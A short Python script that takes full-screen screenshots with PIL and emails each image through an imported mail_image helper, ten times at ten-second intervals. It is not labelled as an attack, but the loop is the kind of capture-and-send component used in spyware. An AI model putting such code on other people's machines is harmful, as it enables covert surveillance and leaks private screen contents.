from PIL import ImageGrab
import time

try:
    from mail_image import  *
except ImportError:
    from .mail_image import *

def get_image(path):
    pc_img = ImageGrab.grab()
    pc_img.save(path)

if __name__=='__main__':
    img_path = "f:\\pc-image.jpg"
    for i in range(10):
        get_image(img_path)
        mail_image(img_path)
        time.sleep(10)
        print('Send...')
